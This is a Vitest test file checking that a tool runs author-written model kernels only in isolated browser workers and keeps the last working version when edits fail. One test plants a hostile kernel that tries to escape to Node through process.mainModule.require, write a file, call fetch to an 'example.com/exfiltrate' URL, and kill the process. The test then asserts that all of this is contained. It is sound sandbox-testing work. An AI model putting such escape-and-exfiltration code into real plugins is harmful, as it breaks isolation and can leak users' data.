/**
 * `explorable-models activity check` (report §15.2, §16, A09): authored kernels and checks are bundled under the import
 * allowlist and evaluated only in browser module workers. A hostile kernel with top-level side effects cannot reach
 * Node and fails safely in the worker; failed edits keep the last working candidate.
 */
import { existsSync } from 'node:fs';
import { readFile, writeFile } from 'node:fs/promises';
import path from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { activity, codes, temporaryDirectory, type Diagnostic } from './activity-support';

interface CheckReport {
  passed: boolean;
  stage: 'validate' | 'bundle' | 'worker';
  diagnostics?: Diagnostic[];
  kernelSources?: { path: string; digest: string }[];
  kernelSourceDigest?: string | null;
  check?: {
    worker: { kernels: { id: string; version: string; mode: string }[]; checks: { id: string }[] | null } | null;
    loadError: { code: string; message: string } | null;
    defaults: { quantities: Record<string, string>; geometry: Record<string, { kind: string; elements: number; sampling?: unknown }> } | null;
    scenarios: { id: string; outcome: string }[];
    checks: { id: string; passed: boolean; detail?: string }[];
    diagnostics: { code: string; path: string; message: string }[];
  };
  blockedRequests?: string[];
  authoredCodeExecution?: string;
  lastGood: { kernelSourceDigest: string | null; directory: string; files: { path: string; sha256: string }[] } | null;
  lastGoodPreserved?: boolean;
}

describe('activity check runs authored code only in browser workers', () => {
  let work: Awaited<ReturnType<typeof temporaryDirectory>>;
  let quad: string, line: string;
  beforeAll(async () => {
    work = await temporaryDirectory('activity-check');
    quad = path.join(work.path, 'quad-check');
    line = path.join(work.path, 'line-check');
    expect((await activity('scaffold', quad, '--from', 'quadratic-gradient-descent')).exitCode).toBe(0);
    expect((await activity('scaffold', line)).exitCode).toBe(0);
  });
  afterAll(async () => { await work.dispose(); });

  it('evaluates the copied quadratic kernel, scenarios and author checks in a worker and records the last good candidate', async () => {
    const { report, exitCode } = await activity<CheckReport>('check', quad);
    expect(exitCode).toBe(0);
    expect(report).toMatchObject({ passed: true, stage: 'worker', authoredCodeExecution: expect.stringContaining('browser module worker') });
    expect(report.check!.worker!.kernels).toEqual([{ id: 'quad-check', version: '0.1.0', mode: 'discrete' }]);
    expect(report.check!.defaults!.quantities).toMatchObject({ position: 'valid', regime: 'valid', index: 'valid' });
    // Developer output states the sampling of sampled curves (report §8.5): a polyline cannot certify values between samples.
    expect(report.check!.defaults!.geometry.curve).toMatchObject({ kind: 'polyline2', sampling: { samples: 201, domain: [-10, 10] } });
    expect(report.check!.scenarios.map(item => item.outcome)).toEqual(['valid', 'valid', 'valid']);
    expect(report.check!.checks).toEqual([expect.objectContaining({ id: 'defaults-evaluate', passed: true })]);
    expect(report.kernelSources!.map(item => item.path)).toEqual(['kernel.ts']);
    expect(report.blockedRequests).toEqual([]);
    expect(report.lastGood).toMatchObject({ kernelSourceDigest: report.kernelSourceDigest });
    expect(await readFile(path.join(report.lastGood!.directory, 'files/kernel.ts'), 'utf8')).toBe(await readFile(path.join(quad, 'kernel.ts'), 'utf8'));
  });

  it('contains a hostile kernel with top-level Node calls and network access in the worker and keeps the last good candidate', async () => {
    const good = await activity<CheckReport>('check', line);
    expect(good.report.passed).toBe(true);
    const lastGood = good.report.lastGood!;
    const marker = path.join(work.path, 'hostile-marker.txt');
    const original = await readFile(path.join(line, 'kernel.ts'), 'utf8');
    await writeFile(path.join(line, 'kernel.ts'), [
      "import type { ModelKernel } from '@explorable-models/core/model';",
      "import model from './model.json';",
      'const g = globalThis as unknown as Record<string, any>;',
      `try { g.require?.('node:fs')?.writeFileSync(${JSON.stringify(marker)}, 'require'); } catch { /* not available */ }`,
      "void fetch('https://example.com/exfiltrate').catch(() => undefined);",
      `g.process.mainModule.require('node:fs').writeFileSync(${JSON.stringify(marker)}, 'process');`,
      'g.process.exit(1);',
      "export const kernel: ModelKernel = { id: model.execution.kernelId, version: model.execution.kernelVersion, mode: 'static', evaluate: () => ({ quantities: {}, geometry: {} }) };",
    ].join('\n'));
    const { report, exitCode } = await activity<CheckReport>('check', line);
    expect(exitCode).toBe(1);
    expect(report).toMatchObject({ passed: false, stage: 'worker', lastGoodPreserved: true });
    expect(report.check!.loadError).toMatchObject({ code: 'WORKER_ERROR', message: expect.stringMatching(/process|mainModule/) });
    expect(existsSync(marker)).toBe(false);
    expect(report.blockedRequests).toEqual([]);
    // This process is alive and the last working candidate is unchanged.
    expect(report.lastGood).toMatchObject({ kernelSourceDigest: lastGood.kernelSourceDigest, directory: lastGood.directory });
    expect(await readFile(path.join(lastGood.directory, 'files/kernel.ts'), 'utf8')).toBe(original);
    await writeFile(path.join(line, 'kernel.ts'), original);
  });

  it('refuses forbidden imports before bundling and never executes them', async () => {
    const marker = path.join(work.path, 'import-marker.txt');
    const original = await readFile(path.join(line, 'kernel.ts'), 'utf8');
    const variants = [
      { source: `import { writeFileSync } from 'node:fs';\nwriteFileSync(${JSON.stringify(marker)}, 'x');\n`, message: /node:fs/ },
      { source: "import { checkParameters } from '@explorable-models/core/model';\nvoid checkParameters;\n", message: /type-only/ },
      { source: "import react from 'react';\nvoid react;\n", message: /react/ },
      { source: "import outside from '../outside.json';\nvoid outside;\n", message: /escapes the package|does not resolve/ },
    ];
    await writeFile(path.join(work.path, 'outside.json'), '{}');
    for (const variant of variants) {
      await writeFile(path.join(line, 'kernel.ts'), `${variant.source}${original}`);
      const { report, exitCode } = await activity<CheckReport>('check', line);
      expect(exitCode).toBe(1);
      expect(report.stage).toBe('validate');
      expect(codes(report.diagnostics)).toContain('INVALID_IMPORT');
      expect(report.diagnostics!.map(item => item.message).join('\n')).toMatch(variant.message);
    }
    expect(existsSync(marker)).toBe(false);
    await writeFile(path.join(line, 'kernel.ts'), original);
  });

  it('reports failing and throwing author checks, kernel identity mismatches and runaway kernels as worker results', async () => {
    const checks = await readFile(path.join(line, 'checks.ts'), 'utf8');
    await writeFile(path.join(line, 'checks.ts'), `${checks}\nchecks.push({ id: 'always-fails', description: 'Fails on purpose.', run: () => 'deliberate failure' });\nchecks.push({ id: 'throws', description: 'Throws.', run: () => { throw new RangeError('boom'); } });\n`);
    let report = (await activity<CheckReport>('check', line)).report;
    expect(report.passed).toBe(false);
    expect(report.check!.checks).toEqual(expect.arrayContaining([
      expect.objectContaining({ id: 'always-fails', passed: false, detail: 'deliberate failure' }),
      expect.objectContaining({ id: 'throws', passed: false, detail: expect.stringContaining('RangeError: boom') }),
      expect.objectContaining({ id: 'probe-on-line', passed: true }),
    ]));
    await writeFile(path.join(line, 'checks.ts'), checks);

    const kernel = await readFile(path.join(line, 'kernel.ts'), 'utf8');
    await writeFile(path.join(line, 'kernel.ts'), kernel.replace('id: model.execution.kernelId', "id: 'some-other-kernel'"));
    report = (await activity<CheckReport>('check', line)).report;
    expect(report.passed).toBe(false);
    expect(report.check!.diagnostics).toEqual(expect.arrayContaining([expect.objectContaining({ code: 'INVALID_REFERENCE', path: 'kernel.ts' })]));

    await writeFile(path.join(line, 'kernel.ts'), kernel.replace('function evaluate({ params }: KernelInput): KernelOutput {', 'function evaluate({ params }: KernelInput): KernelOutput {\n  for (;;) { /* never returns */ }'));
    report = (await activity<CheckReport>('check', line, '--timeout', '800')).report;
    expect(report.passed).toBe(false);
    expect(report.check!.defaults).toBeNull();
    expect(report.check!.diagnostics.map(item => item.code)).toContain('WORKER_TIMEOUT');
    await writeFile(path.join(line, 'kernel.ts'), kernel);
    expect((await activity<CheckReport>('check', line)).report.passed).toBe(true);
  }, 60_000);
});
